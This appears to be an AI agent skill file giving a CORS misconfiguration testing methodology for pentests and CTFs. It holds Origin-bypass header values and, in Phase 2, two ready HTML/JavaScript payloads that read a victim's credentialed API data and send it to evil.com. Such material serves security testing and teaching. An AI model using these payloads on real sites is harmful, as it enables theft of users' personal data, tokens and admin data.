---
name: cors-misconfiguration
description: "CORS misconfiguration detection and exploitation. Use when a target API returns Access-Control-Allow-Origin response headers, requires cross-origin access to sensitive data, or you find that the Origin header is reflected back in the response. Can lead to theft of user sensitive data"
zh-signals: "检测并利用 CORS 跨域配置错误，重点验证 Origin 反射与凭据携带组合导致的数据窃取。信号:CORS,跨域,Origin 反射,credentials,预检请求"
when-to-use: "Use when a target API returns Access-Control-Allow-Origin headers, reflects arbitrary Origin, or permits credentialed cross-origin reads."
metadata:
  tags: "cors,cross-origin,cross-domain,access-control,origin,credentials,preflight"
  category: "exploit"
---

# CORS Misconfiguration Methodology

CORS (Cross-Origin Resource Sharing) misconfiguration allows malicious websites to read the target site's sensitive data cross-origin. The key lies in the `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials` response headers.

## Phase 1: Detect CORS Configuration

### 1.1 Send a request with an Origin header
```
http_request url="http://target/api/userinfo" headers={"Origin":"https://evil.com"}
```

Inspect the response headers:
- `Access-Control-Allow-Origin: https://evil.com` → reflects an arbitrary Origin (**dangerous**)
- `Access-Control-Allow-Origin: *` → wildcard (usually cannot carry cookies)
- `Access-Control-Allow-Credentials: true` → allows carrying cookies (**combined with reflected Origin = critical vulnerability**)
- No ACAO header → CORS is correctly rejected

### 1.2 Test Origin Validation Bypass

```
# Empty Origin
Origin: null

# Subdomain
Origin: https://evil.target.com
Origin: https://target.com.evil.com

# Prefix/suffix matching
Origin: https://attackertarget.com
Origin: https://target.com.attacker.com

# Special protocol
Origin: http://target.com  (HTTPS site accepts an HTTP Origin)
```

### 1.3 Dangerous Combination Assessment

| Allow-Origin | Allow-Credentials | Risk Level |
|-------------|-------------------|----------|
| Reflects an arbitrary Origin | true | **Critical** — enables cross-origin theft of user data |
| `null` | true | **High** — an iframe sandbox can set a null origin |
| `*` | false | **Low** — cannot carry cookies, usually only exposes public data |
| Fixed allowlist | true | Safe (unless the allowlist contains a domain you control)|

## Phase 2: Exploit the CORS Misconfiguration

### 2.1 Reflected Origin + Credentials (most common)
The target returns:
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

Build the exfiltration page:
```html
<script>
fetch('http://target/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // Send to the attacker server
    fetch('http://evil.com/log?data=' + JSON.stringify(data));
  });
</script>
```

### 2.2 null Origin Exploitation
If `Access-Control-Allow-Origin: null`, trigger it with an iframe sandbox:
```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <script>
    fetch('http://target/api/userinfo', {credentials: 'include'})
      .then(r => r.text())
      .then(d => fetch('http://evil.com/log?d=' + encodeURIComponent(d)));
  </script>
"></iframe>
```

## Phase 3: Data Collection

Once the CORS exploitation succeeds, the sensitive data you can read includes:
- User personal information (`/api/profile`, `/api/userinfo`)
- API keys and tokens
- Internal API data
- Admin panel data

**In CTFs**: the flag is usually in an API that requires an admin cookie to access.

## Notes
- A CORS vulnerability requires the victim to visit the attacker's page to trigger it (similar to CSRF/XSS)
- A pure `Access-Control-Allow-Origin: *` does not allow `credentials: include`, so the risk is lower
- Check how preflight (OPTIONS) requests are handled — some frameworks only set CORS on GET, not on OPTIONS
